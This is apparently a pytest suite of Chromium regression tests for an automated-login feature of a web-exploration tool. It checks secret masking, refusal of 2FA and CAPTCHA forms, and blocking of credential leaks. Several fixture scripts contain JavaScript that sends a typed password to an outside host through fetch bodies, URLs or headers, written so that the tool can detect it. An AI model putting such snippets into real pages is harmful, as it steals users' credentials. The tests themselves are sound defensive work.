"""Authentication regressions in real Chromium with fixture-only traffic."""

import asyncio
import json
from dataclasses import asdict

import pytest

from autojev.adapters.playwright_executor import PlaywrightExecutor
from autojev.domain.models import ExplorationOptions

USER = "fixture-login-user"
PASSWORD = "  fixture-login-password  "  # significant whitespace must survive
LOGIN = """<!doctype html><meta charset="utf-8"><title>Login fixture</title>
<style>input,button{display:block;padding:10px;margin:10px}</style>
<h1>Sign in</h1><form id="login">
<input name="username" autocomplete="username" placeholder="Username">
<input name="password" type="password" autocomplete="current-password" placeholder="Password">
<input type="submit" value="Login"></form>
<script>
window.loginSubmissions=0;window.loginInputs=0;
document.querySelector('form').addEventListener('input',()=>window.loginInputs++);
document.querySelector('form').onsubmit=e=>{
 e.preventDefault();window.loginSubmissions++;
 const f=e.target;
 if(f.username.value==='fixture-login-user' && f.password.value==='  fixture-login-password  '){
   history.pushState({},'', '/inventory.html');
   document.body.innerHTML='<h1>Authenticated application</h1><a href="/inventory.html">Products</a>';
 }else{
   const error=document.createElement('p');error.setAttribute('role','alert');
   error.textContent='Invalid login';f.append(error);
 }
};
</script>"""


def fixture_executor_type(html):
    class FixtureExecutor(PlaywrightExecutor):
        requests = []

        async def _prepare_page(self, page):
            await super()._prepare_page(page)

            async def serve(route):
                self.requests.append((route.request.method, route.request.url))
                # No external requests, real providers or user databases.
                if not route.request.url.startswith("http://login.fixture.test/"):
                    await route.abort()
                    return
                body = ('<!doctype html><meta charset="utf-8"><h1>Authenticated application</h1><p>Exploration ready</p>'
                        if route.request.url.endswith('/inventory.html') else html)
                await route.fulfill(content_type="text/html; charset=utf-8", body=body)

            await page.route("**/*", serve)

    return FixtureExecutor


async def fixture_executor(tmp_path, html=LOGIN):
    executor = fixture_executor_type(html)(tmp_path, ExplorationOptions(), headless=True)
    observation = await executor.start("http://login.fixture.test/")
    return executor, observation


@pytest.mark.parametrize("label", ["Login", "Entrar"])
async def test_login_succeeds_locally_and_preserves_password_whitespace(tmp_path, label):
    executor, observation = await fixture_executor(tmp_path, LOGIN.replace('value="Login"', f'value="{label}"'))
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "success", result.reason
        assert result.observation.url.endswith("/inventory.html")
        assert not await executor.is_login_page()
        assert await executor._page.evaluate("window.loginSubmissions") == 1
        assert await executor._page.evaluate("window.loginInputs") == 2
        assert USER not in json.dumps(asdict(result.observation))
        assert PASSWORD.strip() not in json.dumps(asdict(result.observation))
        second = await executor.attempt_login({"username": USER, "password": PASSWORD}, result.observation)
        assert second.reason == "already_attempted"
        assert await executor._page.evaluate("window.loginSubmissions") == 1
        executor.protect_authenticated_history()
        assert executor._authenticated_history_root_url.endswith("/inventory.html")
    finally:
        await executor.close()


async def test_rejected_login_is_not_retried_and_fields_are_masked(tmp_path):
    executor, observation = await fixture_executor(tmp_path)
    try:
        credentials = {"username": USER, "password": "fixture-wrong-password"}
        result = await executor.attempt_login(credentials, observation)
        assert result.status == "rejected"
        assert result.reason == "login_rejected"
        assert await executor._page.evaluate("window.loginSubmissions") == 1
        assert await executor._page.locator('[data-autojev-secret-mask="true"]').count() == 2
        masked = await executor.observe("rejected-login")
        payload = json.dumps(asdict(masked))
        assert all(value not in payload for value in credentials.values())
        assert masked.screenshot
        await executor.attempt_login(credentials, masked)
        assert await executor._page.evaluate("window.loginSubmissions") == 1
    finally:
        await executor.close()


@pytest.mark.parametrize("mutation, reason", [
    ('<input type="password" name="confirm">', "ambiguous_form"),
    ('<input name="otherUsername">', "ambiguous_form"),
    ('<input name="otp" autocomplete="one-time-code">', "authentication_challenge"),
    ('<div class="g-recaptcha" style="width:100px;height:100px">CAPTCHA</div>', "authentication_challenge"),
    ('<input type="checkbox" required>', "additional_required_fields"),
])
async def test_ambiguous_or_challenged_forms_are_untouched(tmp_path, mutation, reason):
    executor, observation = await fixture_executor(tmp_path, LOGIN.replace('</form>', mutation + '</form>'))
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "manual_required"
        assert result.reason == reason
        assert await executor._page.evaluate("window.loginInputs") == 0
        assert await executor._page.evaluate("window.loginSubmissions") == 0
    finally:
        await executor.close()


@pytest.mark.parametrize("mutation", [
    '<form id="login" action="https://outside.fixture.test/">',
    '<form id="login"><input type="submit" value="Login">',
    '<form id="login"><input name="newPassword" type="password">',
])
async def test_cross_origin_or_multiple_candidates_never_receive_secrets(tmp_path, mutation):
    executor, observation = await fixture_executor(tmp_path, LOGIN.replace('<form id="login">', mutation))
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "manual_required"
        assert await executor._page.evaluate("window.loginInputs") == 0
        assert await executor._page.evaluate("window.loginSubmissions") == 0
    finally:
        await executor.close()


async def test_rerender_during_username_fill_fails_closed(tmp_path):
    html = LOGIN.replace("window.loginInputs++;", "window.loginInputs++;")
    html += """<script>document.querySelector('[name=username]').oninput=()=>{
      const password=document.querySelector('[name=password]');
      password.replaceWith(password.cloneNode(true));
    };</script>"""
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.reason == "controls_changed"
        assert await executor._page.locator('[name=password]').input_value() == ""
        assert await executor._page.evaluate("window.loginSubmissions") == 0
    finally:
        await executor.close()


async def test_hidden_password_does_not_mask_a_visible_login_form(tmp_path):
    html = LOGIN.replace('<h1>Sign in</h1>', '<input type="password" style="display:none"><h1>Sign in</h1>')
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        assert await executor.is_login_page()
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "success", result.reason
    finally:
        await executor.close()


async def test_native_get_submit_cannot_put_credentials_in_a_url(tmp_path):
    executor, observation = await fixture_executor(tmp_path, LOGIN.split('<script>')[0])
    try:
        # The SPA default-GET form works in the success test. A native GET is
        # blocked even when the app has no preventDefault handler.
        result = await asyncio.wait_for(executor.attempt_login({"username": USER, "password": PASSWORD}, observation), 15)
        assert result.status == "manual_required"
        assert executor._page.url == "http://login.fixture.test/"
        assert not executor._protect_authenticated_history
    finally:
        await executor.close()


@pytest.mark.parametrize("challenge", [
    '<h1>Enter verification code</h1><input name="code">',
    '<h1>Use your passkey</h1><button>Security key</button>',
    '<h1>Confirme o código de segurança</h1><input>',
    '<h1>Authenticate with 2FA</h1><input>',
])
async def test_additional_factor_after_submit_is_not_authentication_success(tmp_path, challenge):
    html = LOGIN.replace("<h1>Authenticated application</h1><a href=\"/inventory.html\">Products</a>", challenge.replace("'", ""))
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "manual_required", result.reason
        assert result.reason == "authentication_challenge"
        assert await executor.is_login_page()
        challenge_observation = await executor.observe("second-factor")
        from autojev.services.exploration import ExplorationManager
        assert ExplorationManager._needs_login(challenge_observation)
        assert await executor._page.evaluate("window.loginSubmissions") == 1
        assert not executor._protect_authenticated_history
    finally:
        await executor.close()


async def test_transient_application_before_delayed_rejection_is_not_success(tmp_path):
    html = LOGIN.replace(
        "history.pushState({},'', '/inventory.html');",
        "setTimeout(()=>{document.body.innerHTML='<h1>Login rejected</h1><input type=password><p role=alert>Invalid login</p>';},600);",
    )
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "rejected", result.reason
        assert not executor._protect_authenticated_history
    finally:
        await executor.close()


async def test_benign_telemetry_and_short_credentials_do_not_block_login(tmp_path):
    html = LOGIN.replace(USER, "a").replace(PASSWORD, "1").replace(
        "window.loginSubmissions++;",
        "window.loginSubmissions++;fetch('http://cdn.fixture.test/test-asset?v=1').catch(()=>{});",
    )
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": "a", "password": "1"}, observation)
        assert result.status == "success", result.reason
        assert await executor._page.evaluate("window.loginSubmissions") == 1
    finally:
        await executor.close()


async def test_cross_origin_credential_post_is_blocked_before_request(tmp_path):
    html = LOGIN.replace("window.loginSubmissions++;", """window.loginSubmissions++;
      fetch('http://outside.fixture.test/auth', {method:'POST',body:JSON.stringify({password:e.target.password.value})}).catch(()=>{});
    """)
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "manual_required", result.reason
        assert result.reason == "unsafe_authentication_request"
        assert not executor._protect_authenticated_history
    finally:
        await executor.close()


@pytest.mark.parametrize("login_mode", ["success", "rejected", "challenge", "second_factor", "expired_session", "manual"])
async def test_manager_login_gate_and_authenticated_history_are_safe(tmp_path, monkeypatch, login_mode):
    from autojev.adapters.repository import SQLiteRepository
    from autojev.adapters.report import StandaloneHtmlReport
    from autojev.adapters.secrets import EphemeralCredentialVault, SecretCipher
    from autojev.config import Settings
    from autojev.domain.models import ExplorationRequest, ModelSelection, ProviderModel
    from autojev.services.coverage import CoveragePlanner
    from autojev.services.exploration import ExplorationManager

    repo = SQLiteRepository(tmp_path / "fixture.sqlite3", SecretCipher(tmp_path, "fixture"))
    repo.initialize()
    provider = repo.create_provider("Fixture only", "http://fixture.invalid", None, True,
                                    [ProviderModel("fixture-agent", "Agent"), ProviderModel("fixture-aux", "Aux")])
    options = ExplorationOptions(max_steps=3)
    run_id = repo.create_exploration(ExplorationRequest("http://login.fixture.test/",
        ModelSelection(provider.id, "fixture-agent"), ModelSelection(provider.id, "fixture-aux"), options))
    vault = EphemeralCredentialVault()
    if login_mode != "manual":
        vault.put(run_id, {"username": USER, "password": PASSWORD if login_mode != "rejected" else "fixture-wrong-password"})
    html = LOGIN
    if login_mode == "challenge":
        html = html.replace('</form>', '<input name="otp" autocomplete="one-time-code"></form>')
    elif login_mode == "second_factor":
        html = html.replace('<h1>Authenticated application</h1><a href="/inventory.html">Products</a>', '<h1>Enter verification code</h1><input name="code">')
    elif login_mode == "expired_session":
        html = html.replace('<a href="/inventory.html">Products</a>', '<a href="/expired">Products</a>')
    executor_type = fixture_executor_type(html)
    instances, prompts, interventions, planners = [], [], [], []

    class ObservedCoveragePlanner(CoveragePlanner):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.initial_root_url_restorable = None
            planners.append(self)

        def observe(self, observation):
            result = super().observe(observation)
            if self.initial_root_url_restorable is None:
                self.initial_root_url_restorable = self._url_restorable(self.coverage_root_key)
            return result

    class Executor(executor_type):
        authenticated_root = None
        automatic_attempts = 0

        def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
            instances.append(self)

        def protect_authenticated_history(self):
            super().protect_authenticated_history()
            self.authenticated_root = self._authenticated_history_root_url

        async def attempt_login(self, credentials, observation):
            self.automatic_attempts += 1
            return await super().attempt_login(credentials, observation)

    class Client:
        async def chat_json(self, _model, _system, content, **_kwargs):
            prompts.append(content)
            return {"title": "Fixture documentation"}

        def drain_usage(self):
            return {"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0, "cost": 0, "cost_known": False}

    settings = Settings(tmp_path, tmp_path / "fixture.sqlite3", tmp_path / "artifacts", None, (), True, "chromium", 1)
    manager = ExplorationManager(repo, vault, StandaloneHtmlReport(settings.artifact_dir), settings)

    async def manual_gate(_id, observation, executor, panel_message=None, deadline=None):
        interventions.append(panel_message)
        assert await executor.is_login_page()
        return "cancelled"  # simulated user cancellation, not a real run

    monkeypatch.setattr(manager, "_client_for", lambda _id: Client())
    monkeypatch.setattr(manager, "_wait_for_user_input", manual_gate)
    monkeypatch.setattr("autojev.services.exploration.PlaywrightExecutor", Executor)
    monkeypatch.setattr("autojev.services.exploration.CoveragePlanner", ObservedCoveragePlanner)
    await asyncio.wait_for(manager._run(run_id), 25)
    run = repo.get_exploration(run_id)
    event_types = [event["type"] for event in run["events"]]
    if login_mode == "success":
        assert not interventions
        assert "automatic_login_succeeded" in event_types
        assert "authenticated_scope_started" in event_types
        assert instances[0].authenticated_root.endswith('/inventory.html')
        assert run["status"] in {"completed", "partial"}
        assert len(planners) == 2
        assert planners[-1].start_url == "http://login.fixture.test/"
        # The SPA login changed URL without requesting the inventory document.
        # The authenticated logical root alone must not license a GET reload.
        assert not planners[-1].initial_root_url_restorable
    elif login_mode == "expired_session":
        # The site ending a confirmed session is re-entered automatically,
        # through the separate bounded relogin path, never attempt_login.
        relogins = event_types.count("automatic_relogin_started")
        assert 1 <= relogins <= ExplorationManager.MAX_SESSION_RELOGINS
        assert event_types.count("automatic_login_started") == 1
        assert event_types.count("automatic_login_succeeded") == 1 + relogins
        assert instances[0].automatic_attempts == 1
        assert instances[0].authenticated_root.endswith('/inventory.html')
        assert run["status"] in {"completed", "partial", "cancelled"}
    else:
        assert len(interventions) == 1
        assert not instances[0]._protect_authenticated_history
        assert "automatic_login_succeeded" not in event_types
        assert "authenticated_scope_started" not in event_types
        assert run["status"] == "cancelled"
        if login_mode == "manual":
            assert "automatic_login_started" not in event_types
            assert interventions == [None]
        else:
            assert "automatic_login_manual_required" in event_types
            assert interventions[0]
    assert all(value not in json.dumps(run) for value in (USER, PASSWORD.strip(), "fixture-wrong-password"))
    assert all(value not in json.dumps(prompts) for value in (USER, PASSWORD.strip(), "fixture-wrong-password"))
    assert run["usage"]["total_tokens"] == 0
    assert not vault.get(run_id)


async def test_username_hint_without_autocomplete_is_supported(tmp_path):
    executor, observation = await fixture_executor(tmp_path, LOGIN.replace(' autocomplete="username"', ''))
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "success", result.reason
    finally:
        await executor.close()


async def test_company_code_is_not_guessed_as_username(tmp_path):
    html = LOGIN.replace('name="username" autocomplete="username" placeholder="Username"',
                         'name="tenant" placeholder="Código da empresa"')
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.reason == "ambiguous_username"
        assert await executor._page.evaluate("window.loginInputs") == 0
        assert await executor._page.evaluate("window.loginSubmissions") == 0
    finally:
        await executor.close()


async def test_attribute_change_during_fill_cannot_repurpose_login_fields(tmp_path):
    html = LOGIN + """<script>document.querySelector('[name=username]').oninput=()=>{
      document.querySelector('[name=password]').name='paymentSecurityCode';
    };</script>"""
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.reason == "controls_changed"
        assert await executor._page.locator('[type=password]').input_value() == ""
        assert await executor._page.evaluate("window.loginSubmissions") == 0
    finally:
        await executor.close()


@pytest.mark.parametrize("dashboard", [
    '<h1>Bookings</h1><input name="passengerCount">',
    '<h1>Account</h1><nav>MFA settings · Security key</nav>',
    '<h1>Account</h1><input name="verificationStatus">',
    '<h1>Account</h1><p role="alert">Maintenance scheduled tomorrow</p>',
])
async def test_authenticated_dashboard_is_not_mistaken_for_login(tmp_path, dashboard):
    html = LOGIN.replace('<h1>Authenticated application</h1><a href="/inventory.html">Products</a>', dashboard)
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "success", result.reason
        assert not await executor.is_login_page()
        assert not result.observation.page_state["authentication_challenge"]
    finally:
        await executor.close()


@pytest.mark.parametrize("request_expression", [
    "fetch('http://outside.fixture.test/auth',{method:'POST',body:e.target.password.value}).catch(()=>{})",
    "(()=>{const data=new FormData();data.append('password',e.target.password.value);fetch('http://outside.fixture.test/auth',{method:'POST',body:data}).catch(()=>{})})()",
    "fetch('http://outside.fixture.test/auth/'+e.target.password.value).catch(()=>{})",
    "fetch('http://outside.fixture.test/auth',{headers:{Authorization:'Bearer '+e.target.password.value}}).catch(()=>{})",
])
async def test_short_credentials_cannot_escape_through_other_request_formats(tmp_path, request_expression):
    html = LOGIN.replace(PASSWORD, '1234').replace('window.loginSubmissions++;', 'window.loginSubmissions++;' + request_expression + ';')
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": USER, "password": '1234'}, observation)
        assert result.status == "manual_required", result.reason
        assert result.reason == "unsafe_authentication_request"
        assert not any('outside.fixture.test' in url for _, url in executor.requests)
    finally:
        await executor.close()


async def test_same_origin_native_post_login_is_supported(tmp_path):
    html = LOGIN.split('<script>')[0].replace('<form id="login">', '<form id="login" method="post" action="/inventory.html">')
    executor, observation = await fixture_executor(tmp_path, html)
    try:
        result = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert result.status == "success", result.reason
        assert len([method for method, _ in executor.requests if method == 'POST']) == 1
        assert all(USER not in url and PASSWORD.strip() not in url for _, url in executor.requests)
    finally:
        await executor.close()


async def test_session_relogin_follows_only_a_confirmed_login(tmp_path):
    executor, observation = await fixture_executor(tmp_path)
    try:
        credentials = {"username": USER, "password": PASSWORD}
        never = await executor.attempt_session_relogin(credentials, observation)
        assert never.reason == "already_attempted"  # no confirmed login yet
        first = await executor.attempt_login(credentials, observation)
        assert first.status == "success", first.reason
        # The site ends the session: the run is back on the sign-in page.
        await executor._page.goto("http://login.fixture.test/")
        expired = await executor.observe("session-expired")
        again = await executor.attempt_session_relogin(credentials, expired)
        assert again.status == "success", again.reason
        assert again.observation.url.endswith("/inventory.html")
        assert USER not in json.dumps(asdict(again.observation))
    finally:
        await executor.close()


async def test_rejected_session_relogin_is_never_retried(tmp_path):
    executor, observation = await fixture_executor(tmp_path)
    try:
        first = await executor.attempt_login({"username": USER, "password": PASSWORD}, observation)
        assert first.status == "success", first.reason
        await executor._page.goto("http://login.fixture.test/")
        expired = await executor.observe("session-expired")
        wrong = {"username": USER, "password": "fixture-wrong-password"}
        rejected = await executor.attempt_session_relogin(wrong, expired)
        assert rejected.status != "success"
        submissions = await executor._page.evaluate("window.loginSubmissions")
        retry = await executor.attempt_session_relogin({"username": USER, "password": PASSWORD}, expired)
        assert retry.reason == "already_attempted"
        assert await executor._page.evaluate("window.loginSubmissions") == submissions
    finally:
        await executor.close()
